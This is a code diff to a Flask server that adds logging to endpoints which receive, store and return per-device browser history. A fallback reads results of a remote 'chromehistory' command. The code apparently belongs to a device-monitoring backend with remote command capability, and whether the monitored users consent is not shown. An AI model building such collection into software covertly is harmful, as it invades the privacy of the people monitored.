@@ -1366,6 +1366,8 @@ def receive_browser_history():
     if not device_id:
         return jsonify({"error": "Missing device_id"}), 400
 
+    print(f"[{datetime.now().isoformat()}] 📥 Receiving {len(history)} browser history entries for device {device_id}")
+
     entries = []
     for item in history:
         if not isinstance(item, dict):
@@ -1381,6 +1383,7 @@ def receive_browser_history():
 
     if entries:
         db["browser_history"].insert_many(entries)
+        print(f"[{datetime.now().isoformat()}] ✅ Stored {len(entries)} browser history entries for device {device_id}")
 
     return jsonify({"status": "success", "count": len(entries)})
 
@@ -1999,6 +2002,8 @@ def get_browser_history(device_id):
         {"device_id": device_id}
     ).sort("created_at", -1).limit(50))
 
+    print(f"[{datetime.now().isoformat()}] 📖 Fetching browser history for device {device_id} - found {len(history_docs)} entries")
+
     for doc in history_docs:
         history.append({
             "url": doc.get("url"),
@@ -2009,11 +2014,13 @@ def get_browser_history(device_id):
         })
 
     if not history:
+        print(f"[{datetime.now().isoformat()}] ⚠️ No browser history in DB for {device_id}, checking command results...")
         cmd_doc = commands_col.find_one(
             {"device_id": device_id, "command": "chromehistory", "result": {"$ne": None}},
             sort=[("result_received_at", -1), ("created_at", -1)]
         )
         if cmd_doc and isinstance(cmd_doc.get("result"), dict):
+            print(f"[{datetime.now().isoformat()}] ✅ Found history in command result")
             data = cmd_doc.get("result", {}).get("data") or []
             for entry in data:
                 if isinstance(entry, dict):
